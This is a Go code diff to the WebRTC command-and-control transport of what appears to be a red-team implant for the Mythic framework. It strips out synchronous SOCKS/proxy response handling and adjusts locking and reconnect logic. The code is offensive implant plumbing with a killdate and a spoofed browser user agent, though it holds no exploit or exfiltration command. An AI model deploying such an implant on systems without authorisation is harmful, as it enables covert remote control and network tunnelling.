@@ -29,7 +29,6 @@ const (
 	webRTCDefaultUserAgent         = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
 	webRTCDataChannelTimeout       = 30 * time.Second
 	webRTCReconnectMaxRetries      = 5
-	webRTCSyncResponseTimeout      = 60 * time.Second
 	webRTCKillDateCheckInterval    = 60 * time.Second
 	webRTCDataChannelCheckInterval = 200 * time.Millisecond
 	webRTCSDPAnswerTimeout         = 5 * time.Second
@@ -124,14 +123,11 @@ type C2WebRTC struct {
 	ShouldStop      bool
 	killdate        time.Time
 
-	stoppedChannel  chan bool
-	PushChannel     chan structs.MythicMessage
-	responseChannel chan []byte
+	stoppedChannel chan bool
+	PushChannel    chan structs.MythicMessage
 
-	Lock               sync.RWMutex
-	reconnectLock      sync.RWMutex
-	responseMutex      sync.RWMutex
-	waitingForResponse bool
+	Lock          sync.RWMutex
+	reconnectLock sync.RWMutex
 }
 
 func (e C2WebRTC) MarshalJSON() ([]byte, error) {
@@ -213,7 +209,6 @@ func NewC2WebRTC(config WebRTCInitialConfig) (*C2WebRTC, error) {
 		ShouldStop:      true,
 		stoppedChannel:  make(chan bool, 1),
 		PushChannel:     make(chan structs.MythicMessage, 100),
-		responseChannel: make(chan []byte, 1),
 	}, nil
 }
 
@@ -401,10 +396,9 @@ func (c *C2WebRTC) setupWebRTC() error {
 
 func (c *C2WebRTC) setupDataChannel() error {
 	dataChannelConfig := &webrtc.DataChannelInit{
-		Ordered:        boolPtr(true),
-		Protocol:       stringPtr("json"),
-		Negotiated:     boolPtr(false),
-		MaxRetransmits: uint16Ptr(5),
+		Ordered:    boolPtr(true),
+		Protocol:   stringPtr("json"),
+		Negotiated: boolPtr(false),
 	}
 
 	dc, err := c.peerConnection.CreateDataChannel("data", dataChannelConfig)
@@ -779,50 +773,8 @@ func (c *C2WebRTC) SendMessage(output []byte) []byte {
 		return nil
 	}
 
-	if c.isSOCKSMessage(output) {
-		return c.sendDataSync(output)
-	}
-
 	c.sendDataNoResponse(output)
 	return nil
-}
-
-func (c *C2WebRTC) isSOCKSMessage(output []byte) bool {
-	var messageStruct struct {
-		Action string `json:"action"`
-	}
-
-	if json.Unmarshal(output, &messageStruct) != nil {
-		return false
-	}
-
-	socksActions := []string{"socks", "proxy", "connect"}
-	action := strings.ToLower(messageStruct.Action)
-
-	for _, socksAction := range socksActions {
-		if strings.Contains(action, socksAction) {
-			return true
-		}
-	}
-	return false
-}
-
-func (c *C2WebRTC) sendDataSync(sendData []byte) []byte {
-	if !c.isDataChannelReady() {
-		utils.PrintDebug("Data channel not ready for synchronous send")
-		return nil
-	}
-
-	c.setupSyncResponse()
-	defer c.cleanupSyncResponse()
-
-	message, err := c.prepareMessage(sendData)
-	if err != nil {
-		utils.PrintDebug(fmt.Sprintf("Failed to prepare sync message: %v", err))
-		return nil
-	}
-
-	return c.sendAndWaitForResponse(message)
 }
 
 func (c *C2WebRTC) sendDataNoResponse(sendData []byte) {
@@ -838,8 +790,14 @@ func (c *C2WebRTC) sendDataNoResponse(sendData []byte) {
 		return
 	}
 
-	c.Lock.Lock()
-	defer c.Lock.Unlock()
+	c.Lock.RLock()
+	defer c.Lock.RUnlock()
+
+	if c.DataChannel == nil || c.DataChannel.ReadyState() != webrtc.DataChannelStateOpen {
+		utils.PrintDebug("Data channel not ready after preparing async message")
+		go c.reconnect()
+		return
+	}
 
 	if err := c.DataChannel.Send(message); err != nil {
 		utils.PrintDebug(fmt.Sprintf("Failed to send async message: %v", err))
@@ -863,57 +821,6 @@ func (c *C2WebRTC) prepareMessage(sendData []byte) ([]byte, error) {
 	}
 
 	return json.Marshal(message)
-}
-
-func (c *C2WebRTC) setupSyncResponse() {
-	c.responseMutex.Lock()
-	if c.responseChannel == nil {
-		c.responseChannel = make(chan []byte, 1)
-	}
-	c.waitingForResponse = true
-	c.responseMutex.Unlock()
-}
-
-func (c *C2WebRTC) cleanupSyncResponse() {
-	c.responseMutex.Lock()
-	c.waitingForResponse = false
-	c.responseMutex.Unlock()
-}
-
-func (c *C2WebRTC) sendAndWaitForResponse(message []byte) []byte {
-	for i := 0; i < webRTCReconnectMaxRetries; i++ {
-		if c.ShouldStop {
-			return nil
-		}
-
-		if !c.isDataChannelReady() {
-			utils.PrintDebug("Data channel not open for sync send, reconnecting")
-			go c.reconnect()
-			time.Sleep(time.Duration(i+1) * time.Second)
-			continue
-		}
-
-		if err := c.DataChannel.Send(message); err != nil {
-			utils.PrintDebug(fmt.Sprintf("Error sending sync message: %v", err))
-			go c.reconnect()
-			time.Sleep(time.Duration(i+1) * time.Second)
-			continue
-		}
-
-		select {
-		case response := <-c.responseChannel:
-			utils.PrintDebug("Received synchronous response")
-			return response
-		case <-time.After(webRTCSyncResponseTimeout):
-			utils.PrintDebug("Timeout waiting for synchronous response")
-			if i < webRTCReconnectMaxRetries-1 {
-				time.Sleep(time.Duration(i+1) * time.Second)
-			}
-		}
-	}
-
-	utils.PrintDebug("Failed to get synchronous response after retries")
-	return nil
 }
 
 func (c *C2WebRTC) processMessage(data []byte) {
@@ -947,21 +854,6 @@ func (c *C2WebRTC) processMessage(data []byte) {
 
 	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload length: %d", len(payload)))
 	utils.PrintDebug(fmt.Sprintf("processMessage - Decrypted payload: %s", payload))
-
-	c.responseMutex.RLock()
-	isWaiting := c.waitingForResponse
-	respChan := c.responseChannel
-	c.responseMutex.RUnlock()
-
-	if isWaiting && respChan != nil {
-		select {
-		case respChan <- payload:
-			utils.PrintDebug("Delivered payload as synchronous response")
-			return
-		default:
-			utils.PrintDebug("Could not deliver as sync response, handling normally")
-		}
-	}
 
 	c.handleIncomingMessage(payload)
 }
@@ -1221,8 +1113,7 @@ func (c *C2WebRTC) startDataChannelListener() {
 
 			if dataChannel == nil || dataChannel.ReadyState() == webrtc.DataChannelStateClosed {
 				utils.PrintDebug("Data channel actually closed, reconnecting")
-				go c.reconnect()
-				return
+				c.reconnect()
 			}
 		}
 	}
@@ -1247,8 +1138,4 @@ func boolPtr(b bool) *bool {
 
 func stringPtr(s string) *string {
 	return &s
-}
-
-func uint16Ptr(i uint16) *uint16 {
-	return &i
 }
